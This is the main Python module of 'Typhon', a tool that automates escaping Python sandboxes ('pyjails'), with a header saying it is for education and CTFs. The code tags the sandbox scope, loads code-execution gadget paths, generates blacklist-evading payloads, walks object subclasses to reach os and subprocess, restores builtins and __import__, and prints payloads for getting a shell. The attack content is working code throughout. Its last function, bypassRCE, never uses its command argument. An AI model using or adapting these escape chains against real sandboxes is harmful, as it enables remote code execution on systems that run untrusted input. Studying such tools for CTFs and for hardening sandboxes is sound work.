# This code is the main file of the Typhon package.
# It is emphasized again that the code is only for educational purposes 
# (like in CTFs) and should not be used for any malicious purposes.
# The code is maintained on github. If any bugs found or you have any
# suggestions, please raise an issue or pull request on the github 
# repository https://github.com/LamentXU123/Typhon.
# If you have any questions, please feel free to contact me.
# Weilin Du <1372449351@qq.com>, 2025.

import json
import logging

from inspect import currentframe
from typing import Any, Dict, Union

if __name__ == '__main__':
    print('This is the main file of the Typhon package. \
Please run bypass*() function to bypass the sandbox.')
    exit(0)

# need to be set before other imports
log_level_ = 'INFO' # changable in bypassMAIN()
search_depth = 10 # changable in bypassMAIN()
logging.basicConfig(level=log_level_, format='%(levelname)s %(message)s')
logger = logging.getLogger(__name__)

# get current global scope
current_frame = currentframe()
while current_frame.f_globals['__name__'] != '__main__':
    current_frame = current_frame.f_back
current_global_scope = current_frame.f_globals

from utils import *

# The RCE data including RCE functions and their parameters.
with open('RCE_data.json', 'r') as f:
    RCE_data = json.load(f)
BANNER = r'''
    .-')          _                 
   (`_^ (    .----`/                Typhon: a pyjail bypassing tool
    ` )  \_/`   __/     __,    
    __{   |`  __/      /_/     [Typhon Version]: v0.1
   / _{    \__/ '--.  //       [Python Version]: v'''+sys.version.split()[0]+r'''
   \_> \_\  >__/    \((        [Github]: https://github.com/LamentXU123/Typhon
        _/ /` _\_   |))        
'''

print(BANNER)

def bypassMAIN(local_scope: Dict[str, Any] = {},
           banned_chr: list = [], banned_ast: List[ast.AST] = [],
           banned_re: Union[str, List[str]] = [],
           max_length: int = None,
           allow_unicode_bypass: bool = False,
           depth: int = 20,
           print_all_payload: bool = False,
           log_level: str = 'INFO') -> None:
    '''
    This is the main function of the Typhon package.
    Every bypass function calls this for basic bypassing.
    This function basically gets every useful thing in possible
    for further bypassing implemented in other bypass* functions.

    :param local_scope: is a list of local variables in the sandbox environment.
    :param banned_chr: is a list of blacklisted characters.
    :param banned_ast: is a list of banned AST.
    :param banned_re: is a banned regex.
    :param allow_unicode_bypass: if unicode bypasses are allowed.
    :param depth: is the depth that combined bypassing being generarted
    :param print_all_payload: if all payloads should be printed.
    :param log_level: is the logging level, default is INFO, change it to
    DEBUG for more details.
    '''
    global achivements, log_level_, generated_path, search_depth, tagged_scope, try_to_restore, reminder
    reminder = {} # The reminder of bypass method that could not be used in remote (like coherence chain)
    search_depth = depth # The maximum search depth for combined bypassing
    if local_scope == {}:
        # If the local scope is not specified, raise a warning.
        logger.info('[*] local scope not specified, using the global scope.')
        logger.debug('[*] current global scope: %s', current_global_scope)
        local_scope = current_global_scope
        local_scope['__builtins__'] = __builtins__
    log_level_ = log_level.upper()
    if log_level_ not in ['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL']:
        logger.warning('[!] Invalid log level, using INFO instead.')
        log_level_ = 'INFO'
    if log_level != 'DEBUG':
        from warnings import filterwarnings
        filterwarnings('ignore')
    if isinstance(banned_re, str):
        banned_re = [banned_re] # convert to list if it's a string
    logger.setLevel(log_level_)
    achivements = {} # The progress we've gone so far. Being output in the end
    generated_path = {} # The generated bypassing paths e.g. {'GENERATOR': '(a for a in ()).gi_frame'}
    original_scope = copy(local_scope) # fix: In case of some unpickleable objects (like module), using shallow copies
    # changes in local scope comparing to standard builtins
    change_in_builtins = [i for i in local_scope if i in dir(builtins)]

    def try_to_restore(data_name:str, check:object=None, end_of_prog=False):
        """
        Try to obtain certain thing from the original scope.
        data_name is a string that can refer to a list in RCE_data.json
        check is a class-type object to check if the payload is valid, 
        if not specified, any object will be accepted.
        end_of_prog is a boolean flag to indicate if the program is ending if 
        one of the restore success.
        """
        data_name_tag = data_name.upper()
        path = filter_path_list(RCE_data[data_name], tagged_scope)
        if path:
            logger.info('[*] %d paths found to obtain %s. \
Try to bypass blacklist with them. Please be paitent.', len(path), data_name)
            logger.debug('[*] %s paths: %s', data_name, str(path))
            _ = try_bypasses(path, banned_chr, banned_ast, banned_re, max_length, allow_unicode_bypass, local_scope)
            if _:
                success = False
                for i in _:
                    # If end of program, no need to exec to check in case of stucking by RCE function like help()
                    if end_of_prog: exec_with_returns_ = lambda _, __: True
                    else: exec_with_returns_ = exec_with_returns
                    if exec_with_returns_(i, original_scope).__class__ == check or check is None:
                        success = True
                        tagged_scope[i] = [exec_with_returns_(i, original_scope), data_name_tag]
                        achivements[data_name] = [i, len(_)]
                        tags.append(data_name_tag)
                        generated_path[data_name_tag] = i
                        break
                if success:
                    logger.info('[+] Success. %d payload(s) in total.', len(_))
                    logger.debug(f'[*] payloads: {_}')
                    if end_of_prog: 
                        if print_all_payload:
                            bypasses_output(_)
                        bypasses_output(i)
                else:
                    achivements[data_name] = ['None', 0]
                    logger.info('[-] no way to bypass blacklist to obtain %s.', data_name)
            else:
                achivements[data_name] = ['None', 0]
                logger.info('[-] no way to bypass blacklist to obtain %s.', data_name)
        else:
            achivements[data_name] = ['None', 0]
            logger.info('[-] no paths found to obtain %s.', data_name)

    # Step1: Analyze and tag the local scope
    if '__builtins__' not in local_scope:
        local_scope['__builtins__'] = __builtins__
    # not using | for backward compatibility
    local_scope = merge_dicts(local_scope['__builtins__'], local_scope)
    tagged_scope = tag_scope(local_scope, change_in_builtins)
    all_objects = [i[0] for i in tagged_scope.values()]
    # check if we got an UNKNOWN tag
    for i in tagged_scope:
        if tagged_scope[i][0] == 'UNKNOWN':
            logger.warning('[!] Unknown object: %s', tagged_scope[i][0])
    logger.debug('[*] tagged scope: %s', tagged_scope)
    tags = [i[1] for i in tagged_scope.values()]

    # Step2: Try to exec directly with simple paths
    simple_path = filter_path_list(RCE_data['directly_getshell'], tagged_scope)
    if simple_path:
        logger.info('[*] %d paths found to directly getshell. \
Try to bypass blacklist with them. Please be paitent.', len(simple_path))
        logger.debug('[*] simple paths: %s', str(simple_path))
        _ = try_bypasses(simple_path, banned_chr, banned_ast, banned_re, max_length, allow_unicode_bypass, local_scope)
        if _:
            logger.info('[+] directly getshell success. %d payload(s) in total.', len(_))
            logger.debug('[*] payloads to directly getshell: ')
            logger.debug(_)
            logger.info('[+] You now can use this payload to getshell directly with proper input.')
            achivements['directly input bypass'] = [_[0], len(_)]
            if print_all_payload:
                bypasses_output(_)
            bypasses_output(_[0])
        else:
            achivements['directly input bypass'] = ['None', 0]
            logger.info('[-] no way to bypass blacklist to directly getshell.')
    else:
        achivements['directly input bypass'] = ['None', 0]
        logger.info('[-] no paths found to directly getshell.')

    # Step3: Try to find generators
    try_to_restore('generator', (a for a in ()).gi_frame.__class__)

    # Step4: Try to restore type
    try_to_restore('type', type.__class__)

    # Step5: Try to restore object
    try_to_restore('object', object.__class__)

    # Step6: Restore builtins (if possible)
    if 'BUILTINS_SET' in tags: # full lovely builtins set ;)
        logger.info('[*] __builitins__ not deleted, and every builtin is available.')
    elif 'BUILTINS_SET_CHANGED' in tags: # some thing was missing
        logger.info('[*] builitins not fully available (%d is missing)\
in the namespace, try to restore them.',
                    len(change_in_builtins))
        builtin_path = filter_path_list(RCE_data['restore_builtins_in_current_ns'], tagged_scope)
        if builtin_path:
            logger.info('[*] %d paths found to restore builtins. \
Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
            logger.debug('[*] restore paths: %s', str(builtin_path))
            _ = try_bypasses(builtin_path, banned_chr, banned_ast, banned_re, max_length, allow_unicode_bypass, local_scope)
            if _:
                logger.info('[+] builtins restored. %d payload(s) in total.', len(_))
                logger.debug('[*] payloads to restore builtins: ')
                logger.debug(_)
                builtin_dict_found_count, builtin_module_found_count = 0, 0
                builtin_dict_payload, builtin_module_payload = None, None
                for i in _:
                    check_result = exec_with_returns(i, original_scope)
                    if (check_result == __builtins__ 
                        and type(check_result) == dict):
                        if not builtin_dict_found_count:
                            logger.info('[*] Using %s as the restored builtins dict.', i)
                            tagged_scope[i] = [check_result, 'BUILTINS_SET']
                            builtin_dict_payload = i
                            tags.append('BUILTINS_SET')
                            generated_path['BUILTINS_SET'] = i
                        builtin_dict_found_count += 1
                    elif (check_result == builtins 
                            and type(check_result) == ModuleType):
                        if not builtin_module_found_count:
                            logger.info('[*] Using %s as the restored builtins module.', i)
                            tagged_scope[i] = [check_result, 'MOUDLE_BUILTINS']
                            builtin_module_payload = i
                            tags.append('MOUDLE_BUILTINS')
                            generated_path['MOUDLE_BUILTINS'] = i
                        builtin_module_found_count += 1
                    else:
                        if (not check_result == builtins and not check_result == __builtins__):
                            logger.debug('[!] %s is not the restored builtins.', i)
                achivements['builtins set'] = [builtin_dict_payload, builtin_dict_found_count]
                achivements['builtins moudle'] = [builtin_module_payload, builtin_module_found_count]
                if not builtin_dict_payload and not builtin_module_payload:
                    logger.info('[-] no way to find a bypass method to restore builtins.')
            else:
                logger.info('[-] no way to find a bypass method to restore builtins.')
        else:
            logger.info('[-] no paths found to restore builtins.')
    else:
        logger.info('[*] __builtins__ in this namespace is deleted, no way to restore it.')

    # Step7: Try to restore __builtins__ in other namespaces (if possible)
    # The code is somehow duplicated with the previous step, but I'm not turning it to one func caz
    # it is only used twice.
    if 'BUILTINS_SET' not in tags and 'MOUDLE_BUILTINS' not in tags:
        logger.info('[*] try to find __builtins__ in other namespaces.')
        builtin_path = filter_path_list(RCE_data['restore_builtins_in_other_ns'], tagged_scope)
        if builtin_path:
            logger.info('[*] %d paths found to restore builtins in other namespaces. \
Try to bypass blacklist with them. Please be paitent.', len(builtin_path))
            logger.debug('[*] restore paths: %s', str(builtin_path))
            _ = try_bypasses(builtin_path, banned_chr, banned_ast, banned_re, max_length, allow_unicode_bypass, local_scope)
            if _:
                logger.info('[+] builtins restored. %d payload(s) in total.', len(_))
                logger.debug('[*] payloads to restore builtins: ')
                logger.debug(_)
                builtin_dict_found_count, builtin_module_found_count = 0, 0
                builtin_dict_payload, builtin_module_payload = None, None
                for i in _:
                    check_result = exec_with_returns(i, original_scope)
                    if (check_result == __builtins__ 
                        and type(check_result) == dict):
                        if not builtin_dict_found_count:
                            logger.info('[*] Using %s as the restored builtins dict.', i)
                            tagged_scope[i] = [check_result, 'BUILTINS_SET']
                            builtin_dict_payload = i
                            tags.append('BUILTINS_SET')
                            generated_path['BUILTINS_SET'] = i
                        builtin_dict_found_count += 1
                    elif (check_result == builtins 
                            and type(check_result) == ModuleType):
                        if not builtin_module_found_count:
                            logger.info('[*] Using %s as the restored builtins module.', i)
                            tagged_scope[i] = [check_result, 'MOUDLE_BUILTINS']
                            builtin_module_payload = i
                            tags.append('MOUDLE_BUILTINS')
                            generated_path['MOUDLE_BUILTINS'] = i
                        builtin_module_found_count += 1
                    else:
                        if (not check_result == builtins and not check_result == __builtins__):
                            logger.debug('[!] %s is not the restored builtins.', i)
                achivements['builtins set'] = [builtin_dict_payload, builtin_dict_found_count]
                achivements['builtins moudle'] = [builtin_module_payload, builtin_module_found_count]
                if not builtin_dict_payload and not builtin_module_payload:
                    logger.info('[-] no way to find a bypass method to restore builtins in other namespaces.')
            else:
                logger.info('[-] no way to find a bypass method to restore builtins in other namespaces.')
        else:
            logger.info('[-] no paths found to restore builtins in other namespaces.')

    # Step8: Try coherence chain
    if 'OBJECT' in tags:
        logger.info('[*] Trying to find coherence chains.')
        search = ['os', 'subprocess', 'uuid', 'pydoc', '_posixsubprocess',
                'multiprocessing', '__builtins__', 'codecs', 'warnings',
                'importlib', 'weakref', 'reprlib', 'sys']
        search = {item: [] for item in search}
        for index, i in enumerate(().__class__.__bases__[0].__subclasses__()):
            try:
                for j in search:
                    if j in i.__init__.__globals__:
                        object_path = generated_path['OBJECT']
                        payload = f'{object_path}.__subclasses__()[{index}].__init__.__globals__["{j}"]'
                        for _ in BypassGenerator(payload, allow_unicode_bypass=allow_unicode_bypass).generate_bypasses():
                            if not is_blacklisted(_, banned_chr, banned_ast, banned_re, max_length):
                                search[j].append(_)
                                reminder[_] = f'for now, {index} is the index of {i.__name__}, {j} must fit in index of {i.__name__}'
                            continue
            except AttributeError:
                pass
        for k in search:
            payload = search[k]
            if not payload:
                continue
            payload.sort(key=len)
            payload_len = len(payload)
            payload = payload[0]
            output = exec_with_returns(payload, original_scope)
            if type(output) == ModuleType:
                tag = f'MODULE_{output.__name__}'
            else:
                tag = 'BUILTINS_SET'
            tagged_scope[payload] = [output, tag]
            tags.append(tag)
            generated_path[tag] = payload
            achivements[k] = [payload, payload_len]
            logger.info(f'[+] Found coherence chain: {payload} -> {k}')
        logger.info("[*] moudles we have found:")
        logger.info(get_moudle_from_tagged_scope(tagged_scope))
    else:
        logger.info('[*] No object found, skip coherence chains.')

    # Step9: Try to restore __import__
    try_to_restore('import', __import__.__class__)

    # Step10: Try to RCE directly with builtins 
    if 'BUILTINS_SET' in tags or 'MOUDLE_BUILTINS' in tags:
        logger.info('[*] try to RCE directly with builtins.')
        try_to_restore('builtins2RCEinput', end_of_prog=True)

    return bypasses_output(generated_path=generated_path)

def bypassRCE(
    cmd,
    local_scope:dict={},
    banned_chr:list=[],
    banned_ast:list=[],
    banned_re:list=[],
    max_length:int=1000,
    allow_unicode_bypass:bool=False,
    depth:int=20,
    print_all_payload:bool=False,
    log_level:str='INFO'
):
    """
    The main function to try to RCE in sandbox.
    
    :param cmd: is the command to execute.
    :param local_scope: is a list of local variables in the sandbox environment.
    :param banned_chr: is a list of blacklisted characters.
    :param banned_ast: is a list of banned AST.
    :param banned_re: is a banned regex.
    :param max_length: is the maximum length of the payload.
    :param allow_unicode_bypass: if unicode bypasses are allowed.
    :param depth: is the depth that combined bypassing being generarted
    :param print_all_payload: if all payloads should be printed.
    :param log_level: is the logging level, default is INFO, change it to
    DEBUG for more details.
    """

    generated = bypassMAIN(local_scope,
                           banned_chr=banned_chr,
                           banned_ast=banned_ast,
                           banned_re=banned_re,
                           max_length=max_length,
                           allow_unicode_bypass=allow_unicode_bypass,
                           depth=depth,
                           print_all_payload=print_all_payload,
                           log_level=log_level)
    print(tagged_scope)
